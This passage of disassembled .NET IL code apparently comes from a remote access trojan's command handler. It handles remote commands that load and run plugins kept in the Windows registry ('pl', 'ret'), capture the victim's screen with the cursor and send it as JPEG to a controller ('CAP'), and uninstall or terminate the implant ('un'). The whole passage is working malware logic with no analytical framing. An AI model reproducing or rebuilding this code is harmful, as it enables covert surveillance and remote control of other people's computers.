                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_048a:  pop
      IL_048b:  nop
      IL_048c:  ldc.i4.5
      IL_048d:  newarr     [mscorlib]System.String
      IL_0492:  stloc.s    V_56
      IL_0494:  ldloc.s    V_56
      IL_0496:  ldc.i4.0
      IL_0497:  ldstr      "pl"
      IL_049c:  stelem.ref
      IL_049d:  nop
      IL_049e:  ldloc.s    V_56
      IL_04a0:  ldc.i4.1
      IL_04a1:  ldsfld     string j.OK::Y
      IL_04a6:  stelem.ref
      IL_04a7:  nop
      IL_04a8:  ldloc.s    V_56
      IL_04aa:  ldc.i4.2
      IL_04ab:  ldloc.0
      IL_04ac:  ldc.i4.1
      IL_04ad:  ldelem.ref
      IL_04ae:  stelem.ref
      IL_04af:  nop
      IL_04b0:  ldloc.s    V_56
      IL_04b2:  ldc.i4.3
      IL_04b3:  ldsfld     string j.OK::Y
      IL_04b8:  stelem.ref
      IL_04b9:  nop
      IL_04ba:  ldloc.s    V_56
      IL_04bc:  ldc.i4.4
      IL_04bd:  ldc.i4.0
      IL_04be:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_04c3:  stelem.ref
      IL_04c4:  nop
      IL_04c5:  ldloc.s    V_56
      IL_04c7:  call       string [mscorlib]System.String::Concat(string[])
      IL_04cc:  call       bool j.OK::Send(string)
      IL_04d1:  pop
      IL_04d2:  ldloc.s    V_16
      IL_04d4:  ldstr      "A"
      IL_04d9:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_04de:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04e3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04e8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04ed:  stloc.s    V_17
      IL_04ef:  ldloc.s    V_17
      IL_04f1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_04f6:  ldnull
      IL_04f7:  ldstr      "h"
      IL_04fc:  ldc.i4.1
      IL_04fd:  newarr     [mscorlib]System.Object
      IL_0502:  stloc.s    V_57
      IL_0504:  ldloc.s    V_57
      IL_0506:  ldc.i4.0
      IL_0507:  ldsfld     string j.OK::H
      IL_050c:  stelem.ref
      IL_050d:  nop
      IL_050e:  ldloc.s    V_57
      IL_0510:  ldnull
      IL_0511:  ldnull
      IL_0512:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0517:  nop
      IL_0518:  ldloc.s    V_17
      IL_051a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_051f:  ldnull
      IL_0520:  ldstr      "p"
      IL_0525:  ldc.i4.1
      IL_0526:  newarr     [mscorlib]System.Object
      IL_052b:  stloc.s    V_57
      IL_052d:  ldloc.s    V_57
      IL_052f:  ldc.i4.0
      IL_0530:  ldsfld     string j.OK::P
      IL_0535:  stelem.ref
      IL_0536:  nop
      IL_0537:  ldloc.s    V_57
      IL_0539:  ldnull
      IL_053a:  ldnull
      IL_053b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0540:  nop
      IL_0541:  ldloc.s    V_17
      IL_0543:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0548:  ldnull
      IL_0549:  ldstr      "osk"
      IL_054e:  ldc.i4.1
      IL_054f:  newarr     [mscorlib]System.Object
      IL_0554:  stloc.s    V_57
      IL_0556:  ldloc.s    V_57
      IL_0558:  ldc.i4.0
      IL_0559:  ldloc.0
      IL_055a:  ldc.i4.2
      IL_055b:  ldelem.ref
      IL_055c:  stelem.ref
      IL_055d:  nop
      IL_055e:  ldloc.s    V_57
      IL_0560:  ldnull
      IL_0561:  ldnull
      IL_0562:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0567:  nop
      IL_0568:  ldloc.s    V_17
      IL_056a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_056f:  ldnull
      IL_0570:  ldstr      "start"
      IL_0575:  ldc.i4.0
      IL_0576:  newarr     [mscorlib]System.Object
      IL_057b:  ldnull
      IL_057c:  ldnull
      IL_057d:  ldnull
      IL_057e:  ldc.i4.1
      IL_057f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0584:  pop
      IL_0585:  br.s       IL_058f

      IL_0587:  ldc.i4.1
      IL_0588:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_058d:  nop
      IL_058e:  nop
      IL_058f:  ldsfld     bool j.OK::Cn
      IL_0594:  ldc.i4.0
      IL_0595:  ceq
      IL_0597:  box        [mscorlib]System.Boolean
      IL_059c:  ldloc.s    V_17
      IL_059e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05a3:  ldnull
      IL_05a4:  ldstr      "Off"
      IL_05a9:  ldc.i4.0
      IL_05aa:  newarr     [mscorlib]System.Object
      IL_05af:  ldnull
      IL_05b0:  ldnull
      IL_05b1:  ldnull
      IL_05b2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_05b7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05bc:  ldc.i4.1
      IL_05bd:  box        [mscorlib]System.Boolean
      IL_05c2:  ldc.i4.0
      IL_05c3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_05c8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05cd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_05d2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05d7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_05dc:  ldc.i4.0
      IL_05dd:  ceq
      IL_05df:  stloc.s    V_73
      IL_05e1:  ldloc.s    V_73
      IL_05e3:  brtrue.s   IL_0587

      IL_05e5:  ldloc.s    V_17
      IL_05e7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05ec:  ldnull
      IL_05ed:  ldstr      "off"
      IL_05f2:  ldc.i4.1
      IL_05f3:  newarr     [mscorlib]System.Object
      IL_05f8:  stloc.s    V_57
      IL_05fa:  ldloc.s    V_57
      IL_05fc:  ldc.i4.0
      IL_05fd:  ldc.i4.1
      IL_05fe:  box        [mscorlib]System.Boolean
      IL_0603:  stelem.ref
      IL_0604:  nop
      IL_0605:  ldloc.s    V_57
      IL_0607:  ldnull
      IL_0608:  ldnull
      IL_0609:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_060e:  nop
      IL_060f:  nop
      IL_0610:  nop
      IL_0611:  leave      IL_12be

      IL_0616:  br         IL_0df9

      IL_061b:  nop
      IL_061c:  ldloc.s    V_55
      IL_061e:  ldstr      "ret"
      IL_0623:  ldc.i4.0
      IL_0624:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0629:  ldc.i4.0
      IL_062a:  ceq
      IL_062c:  stloc.s    V_73
      IL_062e:  ldloc.s    V_73
      IL_0630:  brfalse    IL_07ef

      IL_0635:  nop
      IL_0636:  ldloc.0
      IL_0637:  ldc.i4.1
      IL_0638:  ldelem.ref
      IL_0639:  ldc.i4.0
      IL_063a:  newarr     [mscorlib]System.Byte
      IL_063f:  call       object j.OK::GTV(string,
                                            object)
      IL_0644:  castclass  uint8[]
      IL_0649:  stloc.s    V_20
      IL_064b:  ldloc.0
      IL_064c:  ldc.i4.2
      IL_064d:  ldelem.ref
      IL_064e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0653:  ldc.i4.s   10
      IL_0655:  clt
      IL_0657:  ldloc.s    V_20
      IL_0659:  ldlen
      IL_065a:  conv.ovf.i4
      IL_065b:  ldc.i4.0
      IL_065c:  ceq
      IL_065e:  and
      IL_065f:  stloc.s    V_73
      IL_0661:  ldloc.s    V_73
      IL_0663:  brfalse.s  IL_06b0

      IL_0665:  ldc.i4.5
      IL_0666:  newarr     [mscorlib]System.String
      IL_066b:  stloc.s    V_56
      IL_066d:  ldloc.s    V_56
      IL_066f:  ldc.i4.0
      IL_0670:  ldstr      "pl"
      IL_0675:  stelem.ref
      IL_0676:  nop
      IL_0677:  ldloc.s    V_56
      IL_0679:  ldc.i4.1
      IL_067a:  ldsfld     string j.OK::Y
      IL_067f:  stelem.ref
      IL_0680:  nop
      IL_0681:  ldloc.s    V_56
      IL_0683:  ldc.i4.2
      IL_0684:  ldloc.0
      IL_0685:  ldc.i4.1
      IL_0686:  ldelem.ref
      IL_0687:  stelem.ref
      IL_0688:  nop
      IL_0689:  ldloc.s    V_56
      IL_068b:  ldc.i4.3
      IL_068c:  ldsfld     string j.OK::Y
      IL_0691:  stelem.ref
      IL_0692:  nop
      IL_0693:  ldloc.s    V_56
      IL_0695:  ldc.i4.4
      IL_0696:  ldc.i4.1
      IL_0697:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_069c:  stelem.ref
      IL_069d:  nop
      IL_069e:  ldloc.s    V_56
      IL_06a0:  call       string [mscorlib]System.String::Concat(string[])
      IL_06a5:  call       bool j.OK::Send(string)
      IL_06aa:  pop
      IL_06ab:  br         IL_07e3

      IL_06b0:  nop
      IL_06b1:  ldloc.0
      IL_06b2:  ldc.i4.2
      IL_06b3:  ldelem.ref
      IL_06b4:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_06b9:  ldc.i4.s   10
      IL_06bb:  cgt
      IL_06bd:  stloc.s    V_73
      IL_06bf:  ldloc.s    V_73
      IL_06c1:  brfalse.s  IL_0711

      IL_06c3:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_06c8:  stloc.s    V_23
      IL_06ca:  ldloc.0
      IL_06cb:  ldc.i4.0
      IL_06cc:  ldelem.ref
      IL_06cd:  ldsfld     string j.OK::Y
      IL_06d2:  ldloc.0
      IL_06d3:  ldc.i4.1
      IL_06d4:  ldelem.ref
      IL_06d5:  ldsfld     string j.OK::Y
      IL_06da:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_06df:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_06e4:  stloc.s    V_22
      IL_06e6:  ldloc.s    V_23
      IL_06e8:  ldarg.0
      IL_06e9:  ldloc.s    V_22
      IL_06eb:  ldarg.0
      IL_06ec:  ldlen
      IL_06ed:  conv.ovf.i4
      IL_06ee:  ldloc.s    V_22
      IL_06f0:  sub.ovf
      IL_06f1:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_06f6:  nop
      IL_06f7:  ldloc.s    V_23
      IL_06f9:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_06fe:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0703:  stloc.s    V_20
      IL_0705:  ldloc.0
      IL_0706:  ldc.i4.1
      IL_0707:  ldelem.ref
      IL_0708:  ldloc.s    V_20
      IL_070a:  ldc.i4.3
      IL_070b:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0710:  pop
      IL_0711:  nop
      IL_0712:  ldc.i4.5
      IL_0713:  newarr     [mscorlib]System.String
      IL_0718:  stloc.s    V_56
      IL_071a:  ldloc.s    V_56
      IL_071c:  ldc.i4.0
      IL_071d:  ldstr      "pl"
      IL_0722:  stelem.ref
      IL_0723:  nop
      IL_0724:  ldloc.s    V_56
      IL_0726:  ldc.i4.1
      IL_0727:  ldsfld     string j.OK::Y
      IL_072c:  stelem.ref
      IL_072d:  nop
      IL_072e:  ldloc.s    V_56
      IL_0730:  ldc.i4.2
      IL_0731:  ldloc.0
      IL_0732:  ldc.i4.1
      IL_0733:  ldelem.ref
      IL_0734:  stelem.ref
      IL_0735:  nop
      IL_0736:  ldloc.s    V_56
      IL_0738:  ldc.i4.3
      IL_0739:  ldsfld     string j.OK::Y
      IL_073e:  stelem.ref
      IL_073f:  nop
      IL_0740:  ldloc.s    V_56
      IL_0742:  ldc.i4.4
      IL_0743:  ldc.i4.0
      IL_0744:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0749:  stelem.ref
      IL_074a:  nop
      IL_074b:  ldloc.s    V_56
      IL_074d:  call       string [mscorlib]System.String::Concat(string[])
      IL_0752:  call       bool j.OK::Send(string)
      IL_0757:  pop
      IL_0758:  ldloc.s    V_20
      IL_075a:  ldstr      "A"
      IL_075f:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0764:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0769:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_076e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0773:  stloc.s    V_21
      IL_0775:  ldc.i4.5
      IL_0776:  newarr     [mscorlib]System.String
      IL_077b:  stloc.s    V_56
      IL_077d:  ldloc.s    V_56
      IL_077f:  ldc.i4.0
      IL_0780:  ldstr      "ret"
      IL_0785:  stelem.ref
      IL_0786:  nop
      IL_0787:  ldloc.s    V_56
      IL_0789:  ldc.i4.1
      IL_078a:  ldsfld     string j.OK::Y
      IL_078f:  stelem.ref
      IL_0790:  nop
      IL_0791:  ldloc.s    V_56
      IL_0793:  ldc.i4.2
      IL_0794:  ldloc.0
      IL_0795:  ldc.i4.1
      IL_0796:  ldelem.ref
      IL_0797:  stelem.ref
      IL_0798:  nop
      IL_0799:  ldloc.s    V_56
      IL_079b:  ldc.i4.3
      IL_079c:  ldsfld     string j.OK::Y
      IL_07a1:  stelem.ref
      IL_07a2:  nop
      IL_07a3:  ldloc.s    V_56
      IL_07a5:  ldc.i4.4
      IL_07a6:  ldloc.s    V_21
      IL_07a8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_07ad:  ldnull
      IL_07ae:  ldstr      "GT"
      IL_07b3:  ldc.i4.0
      IL_07b4:  newarr     [mscorlib]System.Object
      IL_07b9:  ldnull
      IL_07ba:  ldnull
      IL_07bb:  ldnull
      IL_07bc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_07c1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_07c6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_07cb:  stloc.s    V_58
      IL_07cd:  ldloca.s   V_58
      IL_07cf:  call       string j.OK::ENB(string&)
      IL_07d4:  stelem.ref
      IL_07d5:  nop
      IL_07d6:  ldloc.s    V_56
      IL_07d8:  call       string [mscorlib]System.String::Concat(string[])
      IL_07dd:  call       bool j.OK::Send(string)
      IL_07e2:  pop
      IL_07e3:  nop
      IL_07e4:  nop
      IL_07e5:  leave      IL_12be

      IL_07ea:  br         IL_0df9

      IL_07ef:  nop
      IL_07f0:  ldloc.s    V_55
      IL_07f2:  ldstr      "CAP"
      IL_07f7:  ldc.i4.0
      IL_07f8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07fd:  ldc.i4.0
      IL_07fe:  ceq
      IL_0800:  stloc.s    V_73
      IL_0802:  ldloc.s    V_73
      IL_0804:  brfalse    IL_09d7

      IL_0809:  nop
      IL_080a:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_080f:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0814:  stloc.s    V_26
      IL_0816:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_081b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0820:  stloc.s    V_62
      IL_0822:  ldloca.s   V_62
      IL_0824:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0829:  ldloca.s   V_26
      IL_082b:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0830:  ldc.i4     0x21005
      IL_0835:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_083a:  stloc.s    V_28
      IL_083c:  ldloc.s    V_28
      IL_083e:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0843:  stloc.s    V_27
      IL_0845:  ldloca.s   V_25
      IL_0847:  ldloc.s    V_28
      IL_0849:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_084e:  ldloc.s    V_28
      IL_0850:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0855:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_085a:  nop
      IL_085b:  ldloc.s    V_27
      IL_085d:  ldc.i4.0
      IL_085e:  ldc.i4.0
      IL_085f:  ldc.i4.0
      IL_0860:  ldc.i4.0
      IL_0861:  ldloc.s    V_25
      IL_0863:  ldc.i4     0xcc0020
      IL_0868:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      IL_086d:  nop
      IL_086e:  nop
      .try
      {
        IL_086f:  ldloca.s   V_25
        IL_0871:  ldc.i4.s   32
        IL_0873:  ldc.i4.s   32
        IL_0875:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_087a:  nop
        IL_087b:  ldloca.s   V_26
        IL_087d:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_0882:  ldloc.s    V_25
        IL_0884:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0889:  nop
        IL_088a:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_088f:  ldloc.s    V_27
        IL_0891:  ldloc.s    V_26
        IL_0893:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_0898:  nop
        IL_0899:  leave.s    IL_08bd

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_089b:  dup
        IL_089c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08a1:  stloc.s    V_32
        IL_08a3:  nop
        IL_08a4:  ldloc.s    V_32
        IL_08a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08ab:  nop
        IL_08ac:  ldloc.s    V_32
        IL_08ae:  stloc.s    V_33
        IL_08b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08b5:  nop
        IL_08b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_08bb:  leave.s    IL_08bd

      }  // end handler
      IL_08bd:  nop
      IL_08be:  ldloc.s    V_27
      IL_08c0:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_08c5:  nop
      IL_08c6:  ldloc.0
      IL_08c7:  ldc.i4.1
      IL_08c8:  ldelem.ref
      IL_08c9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_08ce:  ldloc.0
      IL_08cf:  ldc.i4.2
      IL_08d0:  ldelem.ref
      IL_08d1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_08d6:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_08db:  stloc.s    V_24
      IL_08dd:  ldloc.s    V_24
      IL_08df:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_08e4:  stloc.s    V_27
      IL_08e6:  ldloc.s    V_27
      IL_08e8:  ldloc.s    V_28
      IL_08ea:  ldc.i4.0
      IL_08eb:  ldc.i4.0
      IL_08ec:  ldloc.s    V_24
      IL_08ee:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_08f3:  ldloc.s    V_24
      IL_08f5:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_08fa:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_08ff:  nop
      IL_0900:  ldloc.s    V_27
      IL_0902:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0907:  nop
      IL_0908:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_090d:  stloc.s    V_30
      IL_090f:  ldstr      "CAP"
      IL_0914:  ldsfld     string j.OK::Y
      IL_0919:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_091e:  stloc.s    V_58
      IL_0920:  ldloca.s   V_58
      IL_0922:  call       uint8[] j.OK::SB(string&)
      IL_0927:  starg.s    b
      IL_0929:  ldloc.s    V_30
      IL_092b:  ldarg.0
      IL_092c:  ldc.i4.0
      IL_092d:  ldarg.0
      IL_092e:  ldlen
      IL_092f:  conv.ovf.i4
      IL_0930:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0935:  nop
      IL_0936:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_093b:  stloc.s    V_31
      IL_093d:  ldloc.s    V_24
      IL_093f:  ldloc.s    V_31
      IL_0941:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_0946:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_094b:  nop
      IL_094c:  ldloc.s    V_31
      IL_094e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0953:  call       string j.OK::md5(uint8[])
      IL_0958:  stloc.s    V_29
      IL_095a:  ldloc.s    V_29
      IL_095c:  ldsfld     string j.OK::lastcap
      IL_0961:  ldc.i4.0
      IL_0962:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0967:  ldc.i4.0
      IL_0968:  ceq
      IL_096a:  ldc.i4.0
      IL_096b:  ceq
      IL_096d:  stloc.s    V_73
      IL_096f:  ldloc.s    V_73
      IL_0971:  brfalse.s  IL_0994

      IL_0973:  ldloc.s    V_29
      IL_0975:  stsfld     string j.OK::lastcap
      IL_097a:  ldloc.s    V_30
      IL_097c:  ldloc.s    V_31
      IL_097e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0983:  ldc.i4.0
      IL_0984:  ldloc.s    V_31
      IL_0986:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_098b:  conv.ovf.i4
      IL_098c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0991:  nop
      IL_0992:  br.s       IL_099e

      IL_0994:  nop
      IL_0995:  ldloc.s    V_30
      IL_0997:  ldc.i4.0
      IL_0998:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_099d:  nop
      IL_099e:  nop
      IL_099f:  ldloc.s    V_30
      IL_09a1:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_09a6:  call       bool j.OK::Sendb(uint8[])
      IL_09ab:  pop
      IL_09ac:  ldloc.s    V_30
      IL_09ae:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_09b3:  nop
      IL_09b4:  ldloc.s    V_31
      IL_09b6:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_09bb:  nop
      IL_09bc:  ldloc.s    V_28
      IL_09be:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_09c3:  nop
      IL_09c4:  ldloc.s    V_24
      IL_09c6:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_09cb:  nop
      IL_09cc:  nop
      IL_09cd:  leave      IL_12be

      IL_09d2:  br         IL_0df9

      IL_09d7:  nop
      IL_09d8:  ldloc.s    V_55
      IL_09da:  ldstr      "un"
      IL_09df:  ldc.i4.0
      IL_09e0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09e5:  ldc.i4.0
      IL_09e6:  ceq
      IL_09e8:  stloc.s    V_73
      IL_09ea:  ldloc.s    V_73
      IL_09ec:  brfalse    IL_0a89

      IL_09f1:  nop
      IL_09f2:  nop
      IL_09f3:  ldloc.0
      IL_09f4:  ldc.i4.1
      IL_09f5:  ldelem.ref
      IL_09f6:  stloc.s    V_63
      IL_09f8:  nop
      IL_09f9:  ldloc.s    V_63
      IL_09fb:  ldstr      "~"
      IL_0a00:  ldc.i4.0
      IL_0a01:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a06:  ldc.i4.0
      IL_0a07:  ceq
      IL_0a09:  stloc.s    V_72
      IL_0a0b:  ldloc.s    V_72
      IL_0a0d:  brfalse.s  IL_0a1b

      IL_0a0f:  nop
      IL_0a10:  call       void j.OK::UNS()
      IL_0a15:  nop
      IL_0a16:  nop
      IL_0a17:  br.s       IL_0a7d

      IL_0a19:  br.s       IL_0a7d

      IL_0a1b:  nop
      IL_0a1c:  ldloc.s    V_63
      IL_0a1e:  ldstr      "!"
      IL_0a23:  ldc.i4.0
      IL_0a24:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a29:  ldc.i4.0
      IL_0a2a:  ceq
      IL_0a2c:  stloc.s    V_73
      IL_0a2e:  ldloc.s    V_73
      IL_0a30:  brfalse.s  IL_0a45

      IL_0a32:  nop
      IL_0a33:  ldc.i4.0
      IL_0a34:  call       void j.OK::pr(int32)
      IL_0a39:  nop
      IL_0a3a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0a3f:  nop
      IL_0a40:  nop
      IL_0a41:  br.s       IL_0a7d

